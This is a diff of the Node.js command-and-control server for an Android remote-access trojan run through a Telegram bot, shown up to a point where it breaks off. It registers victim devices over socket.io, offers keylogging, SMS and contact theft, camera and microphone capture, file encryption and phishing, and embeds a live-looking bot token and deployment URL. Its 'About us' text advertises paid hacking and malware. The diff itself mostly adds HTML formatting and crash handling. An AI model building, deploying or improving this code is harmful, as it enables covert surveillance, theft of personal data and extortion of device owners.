@@ -1,23 +1,34 @@
 const express = require("express");
 const http = require("http");
-const {
-  Server
-} = require("socket.io");
+const { Server } = require("socket.io");
 const telegramBot = require("node-telegram-bot-api");
 const https = require("https");
 const multer = require("multer");
 const fs = require('fs');
 const { createClient } = require('@supabase/supabase-js');
+const path = require('path');
+
 const app = express();
 const server = http.createServer(app);
 const io = new Server(server);
 const uploader = multer();
-const data = JSON.parse(fs.readFileSync("./data.json", "utf8"));
+
+let data = {};
+try {
+  data = JSON.parse(fs.readFileSync("./data.json", "utf8"));
+} catch (e) {
+  console.log("No data.json found or invalid format, continuing without it.");
+}
 
 // Tumhara Bot Token laga diya
 const bot = new telegramBot("8709139578:AAER0NWsrjN2m1skAmD5w8fmD14Sl9yQTwE", {
   'polling': true,
   'request': {}
+});
+
+// Polling error handling to prevent crash
+bot.on("polling_error", (err) => {
+  console.error("Polling Error:", err.message);
 });
 
 // Tumhara Supabase URL aur Key laga di
@@ -29,12 +40,15 @@ const loggedInUsers = new Map();
 const BASE_URL = "https://doge-production-517d.up.railway.app";
 
 // Emojis ko categories aur actions ke hisab se set kar diya
-const actions = ["📇 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 🔴", "💬 𝚂𝙼𝚂 🔴", "📞 𝙲𝚊𝚕𝚕𝚜 🔴", "📱 𝙰𝚙𝚙𝚜 🔴", "📸 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 🔴", "🤳 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 🔴", "🎤 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 🔴", "📋 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 🔴", "🖼️ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 🔴", "🔔 𝚃𝚘𝚊𝚜𝚝 🔴", "📤 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 🔴", "📳 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 🔴", "▶️ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 🔴", "⏹️ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 🔴", "⌨️ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 🔴", "🔕 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 🔴", "📁 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 🔴", "🖼️ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 🔴", "🔒 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 🔴", "🔓 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 🔴", "📨 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 🔴", "📲 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 🔴", "🌐 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 🔴", "🎣 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 🔴", "🔙 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 🔴"];
+const actions = ["<b>📇 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 🔴</b>", "<b>💬 𝚂𝙼𝚂 🔴</b>", "<b>📞 𝙲𝚊𝚕𝚕𝚜 🔴</b>", "<b>📱 𝙰𝚙𝚙𝚜 🔴</b>", "<b>📸 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 🔴</b>", "<b>🤳 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 🔴</b>", "<b>🎤 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 🔴</b>", "<b>📋 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 🔴</b>", "<b>🖼️ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 🔴</b>", "<b>🔔 𝚃𝚘𝚊𝚜𝚝 🔴</b>", "<b>📤 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 🔴</b>", "<b>📳 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 🔴</b>", "<b>▶️ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 🔴</b>", "<b>⏹️ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 🔴</b>", "<b>⌨️ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 🔴</b>", "<b>🔕 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 🔴</b>", "<b>📁 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 🔴</b>", "<b>🖼️ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 🔴</b>", "<b>🔒 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 🔴</b>", "<b>🔓 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 🔴</b>", "<b>📨 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 🔴</b>", "<b>📲 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 🔴</b>", "<b>🌐 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 🔴</b>", "<b>🎣 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 🔴</b>", "<b>🔙 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 🔴</b>"];
 
 app.use(express.json());
 
+// Serve static files from the 'public' directory
+app.use(express.static('public'));
+
 // Acha sa progress bar
-const loadingFrames = ["[▯▯▯▯▯▯▯▯▯▯] 0%", "[██▯▯▯▯▯▯▯▯] 20%", "[████▯▯▯▯▯▯] 40%", "[██████▯▯▯▯] 60%", "[████████▯▯] 80%", "[██████████] 100%"];
+const loadingFrames = ["<b>[▯▯▯▯▯▯▯▯▯▯] 0%</b>", "<b>[██▯▯▯▯▯▯▯▯] 20%</b>", "<b>[████▯▯▯▯▯▯] 40%</b>", "<b>[██████▯▯▯▯] 60%</b>", "<b>[████████▯▯] 80%</b>", "<b>[██████████] 100%</b>"];
 
 async function sendAnimatedProgress(chatId, deviceModel) {
   const header = `<b>📩 𝙼𝚎𝚜𝚜𝚊𝚐𝚎 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚛𝚘𝚖 → ${deviceModel}\n\n𝙼𝚎𝚜𝚜𝚊𝚐𝚎 → 𝚃𝚑𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚑𝚊𝚜 𝚜𝚝𝚊𝚛𝚝𝚎𝚍 𝚞𝚙𝚕𝚘𝚊𝚍𝚒𝚗𝚐 𝚝𝚑𝚎 𝚏𝚒𝚕𝚎, 𝚙𝚕𝚎𝚊𝚜𝚎 𝚋𝚎 𝚙𝚊𝚝𝚒𝚎𝚗𝚝</b>`;
@@ -43,7 +57,7 @@ async function sendAnimatedProgress(chatId, deviceModel) {
   const interval = setInterval(async () => {
     if (frame >= loadingFrames.length) {
       clearInterval(interval);
-      await bot.editMessageText(header + `\n\n[██████████] 100% ✅`, {
+      await bot.editMessageText(header + `\n\n<b>[██████████] 100% ✅</b>`, {
         chat_id: chatId,
         message_id: sentMsg.message_id,
         parse_mode: "HTML"
@@ -81,7 +95,7 @@ app.post("/register", async (req, res) => {
   if (!uid || !password) return res.status(400).json({ error: "uid and password required" });
   const { data: existing } = await supabase.from("rm-d").select("*").eq("uid", uid).single();
   if (existing) return res.status(409).json({ error: "User already exists" });
-  const generated_url = `${BASE_URL}/${uid}`;
+  const generated_url = `${BASE_URL}/index.html?uid=${uid}`; // Added /index.html logic
   const { error } = await supabase.from("rm-d").insert([{ uid, password, generated_url }]);
   if (error) return res.status(500).json({ error: "Registration failed" });
   res.json({ success: true, message: "Registered successfully" });
@@ -108,7 +122,7 @@ app.post("/:uid", async (req, res) => {
   if (!user) return res.status(404).json({ error: "Not found" });
   const tgId = loggedInUsers.get(String(uid));
   if (tgId) {
-    bot.sendMessage(tgId, `<b>📊 𝙳𝚊𝚝𝚊 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚘𝚛 𝚢𝚘𝚞𝚛 𝚍𝚊𝚜𝚑𝚋𝚘𝚊𝚛𝚍</b>\n\n${JSON.stringify(req.body)}`, { 'parse_mode': "HTML" });
+    bot.sendMessage(tgId, `<b>📊 𝙳𝚊𝚝𝚊 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚘𝚛 𝚢𝚘𝚞𝚛 𝚍𝚊𝚜𝚑𝚋𝚘𝚊𝚛𝚍</b>\n\n<b>${JSON.stringify(req.body)}</b>`, { 'parse_mode': "HTML" });
   }
   res.json({ success: true });
 });
@@ -120,32 +134,40 @@ io.on("connection", _0x48afef => {
   _0x48afef.model = _0x35d854;
   _0x48afef.version = _0x3e1fde;
   let _0x5ede9b = "<b>🔌 𝙽𝚎𝚠 𝚍𝚎𝚟𝚒𝚌𝚎 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍</b>\n\n" + ("<b>𝚖𝚘𝚍𝚎𝚕</b> → " + _0x35d854 + "\n") + ("<b>𝚟𝚎𝚛𝚜𝚒𝚘𝚗</b> → " + _0x3e1fde + "\n") + ("<b>𝚒𝚙</b> → " + _0x4c49f4 + "\n") + ("<b>𝚝𝚒𝚖𝚎</b> → " + _0x48afef.handshake.time + "\n\n");
-  bot.sendMessage(data.id, _0x5ede9b, {
-    'parse_mode': "HTML"
-  });
-  _0x48afef.on("disconnect", () => {
-    let _0x4c86f2 = "<b>🔴 𝙳𝚎𝚟𝚒𝚌𝚎 𝚍𝚒𝚜𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍</b>\n\n" + ("<b>𝚖𝚘𝚍𝚎𝚕</b> → " + _0x35d854 + "\n") + ("<b>𝚟𝚎𝚛𝚜𝚒𝚘𝚗</b> → " + _0x3e1fde + "\n") + ("<b>𝚒𝚙</b> → " + _0x4c49f4 + "\n") + ("<b>𝚝𝚒𝚖𝚎</b> → " + _0x48afef.handshake.time + "\n\n");
-    bot.sendMessage(data.id, _0x4c86f2, {
+  if(data.id) {
+    bot.sendMessage(data.id, _0x5ede9b, {
       'parse_mode': "HTML"
     });
+  }
+  _0x48afef.on("disconnect", () => {
+    let _0x4c86f2 = "<b>🔴 𝙳𝚎𝚟𝚒𝚌𝚎 𝚍𝚒𝚜𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍</b>\n\n" + ("<b>𝚖𝚘𝚍𝚎𝚕</b> → " + _0x35d854 + "\n") + ("<b>𝚟𝚎𝚛𝚜𝚒𝚘𝚗</b> → " + _0x3e1fde + "\n") + ("<b>𝚒𝚙</b> → " + _0x4c49f4 + "\n") + ("<b>𝚝𝚒𝚖𝚎</b> → " + _0x48afef.handshake.time + "\n\n");
+    if(data.id){
+      bot.sendMessage(data.id, _0x4c86f2, {
+        'parse_mode': "HTML"
+      });
+    }
   });
   _0x48afef.on("message", _0x44fcc5 => {
     if (_0x44fcc5 === "The device has started uploading the file, please be patient") {
-      sendAnimatedProgress(data.id, _0x35d854);
+      if(data.id) sendAnimatedProgress(data.id, _0x35d854);
     } else {
-      bot.sendMessage(data.id, "<b>📩 𝙼𝚎𝚜𝚜𝚊𝚐𝚎 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚛𝚘𝚖 → " + _0x35d854 + "\n\n𝙼𝚎𝚜𝚜𝚊𝚐𝚎 → </b>" + _0x44fcc5, {
-        'parse_mode': "HTML"
-      });
+      if(data.id){
+        bot.sendMessage(data.id, "<b>📩 𝙼𝚎𝚜𝚜𝚊𝚐𝚎 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚛𝚘𝚖 → " + _0x35d854 + "\n\n𝙼𝚎𝚜𝚜𝚊𝚐𝚎 → </b><b>" + _0x44fcc5 + "</b>", {
+          'parse_mode': "HTML"
+        });
+      }
     }
   });
 });
 
 bot.on("message", _0xdbde0c => {
+  if(!data.id) data.id = _0xdbde0c.chat.id; // Fallback if data.id isn't set initially
+  
   if (_0xdbde0c.text === "/start") {
     bot.sendMessage(data.id, "<b>👑 𝚆𝚎𝚕𝚌𝚘𝚖𝚎 𝚝𝚘 RM UCHIHA BOT\n\n⚠️ Ethical use only. This tool is made for testing and ethical use, and you are responsible for your actions.\n\n𝙰𝚗𝚢 𝚖𝚒𝚜𝚞𝚜𝚎 𝚒𝚜 𝚝𝚑𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚜𝚒𝚋𝚒𝚕𝚒𝚝𝚢 𝚘𝚏 𝚝𝚑𝚎 𝚙𝚎𝚛𝚜𝚘𝚗!\n\n𝙳𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚍 𝚋𝚢: <b>Romeo Uchiha</b>\n\n𝚄𝚜𝚎 /lg uid@password 𝚝𝚘 𝚕𝚘𝚐𝚒𝚗</b>", {
       'parse_mode': "HTML",
       'reply_markup': {
-        'keyboard': [["📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴", "⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴"], ["ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴"]],
+        'keyboard': [["<b>📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴</b>", "<b>⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴</b>"]],
         'resize_keyboard': true
       }
     });
@@ -160,7 +182,7 @@ bot.on("message", _0xdbde0c => {
           bot.sendMessage(_0xdbde0c.chat.id, "<b>🔴 Login failed. Invalid uid or password.</b>", { 'parse_mode': "HTML" });
         } else {
           loggedInUsers.set(String(uid), _0xdbde0c.chat.id);
-          bot.sendMessage(_0xdbde0c.chat.id, `<b>✅ Login successful! Welcome, <b>Romeo Uchiha</b>.\n\n🔴 Your dashboard URL:\n${user.generated_url}</b>`, { 'parse_mode': "HTML" });
+          bot.sendMessage(_0xdbde0c.chat.id, `<b>✅ Login successful! Welcome, <b>Romeo Uchiha</b>.\n\n🔴 Your dashboard URL:\n<b>${user.generated_url}</b></b>`, { 'parse_mode': "HTML" });
         }
       });
     }
@@ -190,7 +212,7 @@ bot.on("message", _0xdbde0c => {
       bot.sendMessage(data.id, "<b>✅ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n🔴 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
         'parse_mode': "HTML",
         'reply_markup': {
-          'keyboard': [["📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴", "⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴"], ["ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴"]],
+          'keyboard': [["<b>📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴</b>", "<b>⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴</b>"]],
           'resize_keyboard': true
         }
       });
@@ -220,7 +242,7 @@ bot.on("message", _0xdbde0c => {
         bot.sendMessage(data.id, "<b>✅ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n🔴 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
           'parse_mode': "HTML",
           'reply_markup': {
-            'keyboard': [["📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴", "⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴"], ["ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴"]],
+            'keyboard': [["<b>📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴</b>", "<b>⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴</b>"]],
             'resize_keyboard': true
           }
         });
@@ -232,7 +254,7 @@ bot.on("message", _0xdbde0c => {
           bot.sendMessage(data.id, "<b>📝 𝙽𝚘𝚠 𝙴𝚗𝚝𝚎𝚛 𝚊 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚝𝚘 " + _0x16b4e5 + "</b>\n\n", {
             'parse_mode': "HTML",
             'reply_markup': {
-              'keyboard': [["❌ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 🔴"]],
+              'keyboard': [["<b>❌ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 🔴</b>"]],
               'resize_keyboard': true,
               'one_time_keyboard': true
             }
@@ -271,7 +293,7 @@ bot.on("message", _0xdbde0c => {
             bot.sendMessage(data.id, "<b>✅ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n🔴 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
               'parse_mode': "HTML",
               'reply_markup': {
-                'keyboard': [["📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴", "⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴"], ["ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴"]],
+                'keyboard': [["<b>📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴</b>", "<b>⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴</b>"]],
                 'resize_keyboard': true
               }
             });
@@ -301,7 +323,7 @@ bot.on("message", _0xdbde0c => {
               bot.sendMessage(data.id, "<b>✅ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n🔴 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
                 'parse_mode': "HTML",
                 'reply_markup': {
-                  'keyboard': [["📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴", "⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴"], ["ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴"]],
+                  'keyboard': [["<b>📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴</b>", "<b>⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴</b>"]],
                   'resize_keyboard': true
                 }
               });
@@ -331,7 +353,7 @@ bot.on("message", _0xdbde0c => {
                 bot.sendMessage(data.id, "<b>✅ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n🔴 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
                   'parse_mode': "HTML",
                   'reply_markup': {
-                    'keyboard': [["📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴", "⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴"], ["ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴"]],
+                    'keyboard': [["<b>📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴</b>", "<b>⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴</b>"]],
                     'resize_keyboard': true
                   }
                 });
@@ -365,12 +387,12 @@ bot.on("message", _0xdbde0c => {
                   bot.sendMessage(data.id, "<b>✅ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n🔴 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
                     'parse_mode': "HTML",
                     'reply_markup': {
-                      'keyboard': [["📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴", "⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴"], ["ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴"]],
+                      'keyboard': [["<b>📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴</b>", "<b>⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴</b>"]],
                       'resize_keyboard': true
                     }
                   });
                 } else {
-                  if (_0xdbde0c.text === "📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴") {
+                  if (_0xdbde0c.text === "<b>📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴</b>") {
                     if (io.sockets.sockets.size === 0x0) {
                       bot.sendMessage(data.id, "<b>📭 𝚃𝚑𝚎𝚛𝚎 𝚒𝚜 𝚗𝚘 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚍𝚎𝚟𝚒𝚌𝚎</b>\n\n", {
                         'parse_mode': "HTML"
@@ -387,7 +409,7 @@ bot.on("message", _0xdbde0c => {
                       });
                     }
                   } else {
-                    if (_0xdbde0c.text === "⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴") {
+                    if (_0xdbde0c.text === "<b>⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴</b>") {
                       if (io.sockets.sockets.size === 0x0) {
                         bot.sendMessage(data.id, "<b>📭 𝚃𝚑𝚎𝚛𝚎 𝚒𝚜 𝚗𝚘 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚍𝚎𝚟𝚒𝚌𝚎</b>\n\n", {
                           'parse_mode': "HTML"
@@ -395,10 +417,10 @@ bot.on("message", _0xdbde0c => {
                       } else {
                         let _0x307c8a = [];
                         io.sockets.sockets.forEach((_0x6307e5, _0x56439e, _0x42b7c1) => {
-                          _0x307c8a.push([_0x6307e5.model]);
+                          _0x307c8a.push([`<b>${_0x6307e5.model}</b>`]);
                         });
-                        _0x307c8a.push(["🌐 𝙰𝚕𝚕 🔴"]);
-                        _0x307c8a.push(["🔙 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 🔴"]);
+                        _0x307c8a.push(["<b>🌐 𝙰𝚕𝚕 🔴</b>"]);
+                        _0x307c8a.push(["<b>🔙 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 🔴</b>"]);
                         bot.sendMessage(data.id, "<b>🎯 𝚂𝚎𝚕𝚎𝚌𝚝 𝚍𝚎𝚟𝚒𝚌𝚎 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚊𝚌𝚝𝚒𝚘𝚗</b>\n\n", {
                           'parse_mode': 'HTML',
                           'reply_markup': {
@@ -409,27 +431,27 @@ bot.on("message", _0xdbde0c => {
                         });
                       }
                     } else {
-                      if (_0xdbde0c.text === "ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴") {
+                      if (_0xdbde0c.text === "<b>ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴</b>") {
                         bot.sendMessage(data.id, "<b>ℹ️ For paid work contact <b>Romeo Uchiha</b>\n𝚆𝚎 𝚑𝚊𝚌𝚔, 𝚆𝚎 𝚕𝚎𝚊𝚔, 𝚆𝚎 𝚖𝚊𝚔𝚎 𝚖𝚊𝚕𝚠𝚊𝚛𝚎\n\nADMIN → <b>Romeo Uchiha</b></b>\n\n", {
                           'parse_mode': 'HTML'
                         });
                       } else {
-                        if (_0xdbde0c.text === "🔙 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 🔴") {
+                        if (_0xdbde0c.text === "<b>🔙 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 🔴</b>") {
                           bot.sendMessage(data.id, "<b>🏠 𝙼𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
                             'parse_mode': "HTML",
                             'reply_markup': {
-                              'keyboard': [["📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴", "⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴"], ["ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴"]],
+                              'keyboard': [["<b>📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴</b>", "<b>⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴</b>"]],
                               'resize_keyboard': true
                             }
                           });
                         } else {
-                          if (_0xdbde0c.text === "❌ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 🔴") {
+                          if (_0xdbde0c.text === "<b>❌ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 🔴</b>") {
                             let _0x3202e5 = io.sockets.sockets.get(appData.get("currentTarget")).model;
                             if (_0x3202e5 == "all") {
